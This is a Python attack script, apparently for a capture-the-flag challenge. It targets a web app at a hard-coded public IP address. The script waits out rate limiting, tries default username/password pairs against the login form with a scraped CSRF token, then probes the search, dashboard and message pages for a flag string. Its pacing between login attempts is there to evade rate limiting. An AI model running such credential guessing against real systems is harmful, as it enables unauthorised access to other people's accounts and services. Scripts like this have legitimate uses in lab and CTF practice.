import requests
import re
import os
import time

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("等待速率限制解除...")
print("="*70)

# 等待60秒
print("等待60秒...")
time.sleep(60)

print("\n开始测试...")

# 尝试登录
print("\n" + "="*70)
print("尝试登录")
print("="*70)

# 获取新的CSRF
r = session.get(f"{TARGET}/login", timeout=15)
csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
csrf_token = csrf.group(1) if csrf else ""

print(f"CSRF Token: {csrf_token}")

# 尝试少量凭据（避免再次触发速率限制）
credentials = [
    ("admin", "admin"),
    ("admin", "term3lab"),
    ("admin", "ctf123"),
    ("ctf", "ctf"),
    ("player", "player"),
]

for username, password in credentials:
    try:
        data = {"username": username, "password": password, "csrf": csrf_token}
        r = session.post(f"{TARGET}/login", data=data, timeout=15)
        
        print(f"\n>>> {username}/{password}")
        print(f"状态码: {r.status_code}")
        
        if r.status_code == 200:
            # 检查是否登录成功
            if "用户名或密码错误" not in r.text and "登录" not in r.text[:100]:
                print(f"可能登录成功!")
                print(f"内容: {r.text[:500]}")
                
                # 尝试访问控制台
                r2 = session.get(f"{TARGET}/dashboard", timeout=15)
                print(f"\n控制台内容:")
                print(f"状态码: {r2.status_code}")
                print(f"内容: {r2.text}")
                
                # 搜索flag
                flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)
            else:
                print(f"登录失败")
        
        # 等待一下避免速率限制
        time.sleep(3)
    except Exception as e:
        print(f"错误: {e}")

# 检查搜索功能中是否有flag相关信息
print("\n" + "="*70)
print("检查搜索功能")
print("="*70)

search_terms = [
    "flag",
    "FLAG",
    "secret",
    "admin",
    "password",
    "term3lab",
    "ctf",
]

for term in search_terms:
    try:
        r = session.get(f"{TARGET}/search", params={"q": term}, timeout=15)
        if r.status_code == 200:
            # 检查是否有结果
            results = re.findall(r'<h2>(.*?)</h2>', r.text)
            
            print(f"\n>>> 搜索 '{term}': {len(results)} 个结果")
            
            for result in results[:5]:
                print(f"  - {result.strip()}")
            
            # 搜索flag
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
    except:
        pass

# 检查控制台页面
print("\n" + "="*70)
print("直接访问控制台")
print("="*70)

r = session.get(f"{TARGET}/dashboard", timeout=15)
print(f"状态码: {r.status_code}")
print(f"内容: {r.text}")

# 搜索flag
flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
if flag_match:
    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
    exit(0)

# 检查消息功能
print("\n" + "="*70)
print("检查消息功能")
print("="*70)

r = session.get(f"{TARGET}/message", timeout=15)
print(f"状态码: {r.status_code}")
print(f"内容: {r.text}")

# 搜索flag
flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
if flag_match:
    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
    exit(0)

# 尝试提交消息
csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
csrf_token = csrf.group(1) if csrf else ""

message_data = {"author": "test", "content": "test message", "csrf": csrf_token}
r = session.post(f"{TARGET}/message", data=message_data, timeout=15)

print(f"\n提交消息后:")
print(f"状态码: {r.status_code}")
print(f"内容: {r.text}")

# 搜索flag
flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
if flag_match:
    print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
    exit(0)

print("\n测试完成")